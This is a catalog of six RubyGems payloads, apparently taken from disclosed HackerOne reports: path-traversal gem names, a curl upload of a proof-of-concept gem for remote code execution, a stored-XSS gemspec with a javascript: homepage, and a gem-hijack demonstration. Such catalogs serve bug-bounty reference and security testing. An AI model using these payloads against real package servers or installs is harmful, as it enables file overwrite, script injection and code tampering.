# RubyGems

6 payloads.

### `c434c0d5`

```
../../../../../any/where
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0

### `c79009b1`

```
../../../../../../../../../../tmp/malicious
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0

### `2be3302c`

```
../gems/rack
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0

### `15c1fdad`

```
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://target.com/api/v1/gems
```

— [Remote code execution on target.com](https://hackerone.com/reports/274990) · RubyGems · [max](https://hackerone.com/max) · $1,500.0

### `1febf945`

```
Gem::Specification.new do |s|
  s.name = 'securitytest'
  s.version = '0.1.0'
  s.date = '2017-11-10'
  s.summary = "This is a proof-of-concept gem"
    s.description = "Select the WWW hyperlink."
    s.authors = ["Author Name"]
  s.homepage = 'javascript:confirm(document.domain)'
end
```

— [\[gem server\] Stored XSS via crafted JavaScript URL inclusion in Gemspec](https://hackerone.com/reports/289313) · RubyGems · [ysx](https://hackerone.com/ysx)

### `6def154b`

```
victim$ gem fetch --clear-sources --source file:///home/user/trusted-gem-path minitest
victim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -
lib/hacked.rb
```

— [DNS SRV lookup of file:// sources enables local hijacking of gems](https://hackerone.com/reports/411519) · RubyGems · [plover](https://hackerone.com/plover)
